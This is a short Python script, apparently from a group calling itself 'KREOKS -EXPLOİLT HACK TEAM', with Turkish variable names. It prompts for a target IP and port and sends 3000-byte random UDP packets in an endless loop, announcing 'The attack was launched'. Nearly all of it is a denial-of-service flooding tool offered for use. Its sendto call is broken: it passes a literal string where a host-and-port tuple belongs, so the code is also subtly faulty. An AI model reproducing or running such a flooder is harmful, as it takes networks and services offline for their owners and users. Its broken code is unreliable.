import socket
import random
import os

os.system("clear")
banner = """
K   K  RRRR   EEEE   OOO   K   K  SSS
K  K   R   R  E     O   O  K  K   S
K K    RRRR   EEE   O   O  K K     SSS
K  K   R  R   E     O   O  K  K       S
K   K  R   R  EEEE   OOO   K   K  SSS 
-EXPLOİLT HACK TEAM
"""


print(banner)

hedef_ip=str(input("Target ip: "))
hedef_port=input("Target port:: ")

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
    sock.sendto(bytes,("hedef ip,hedef_port"))
    sayac=sayac+1
    print("The attack was launched,the package sent:%s"%(sayac))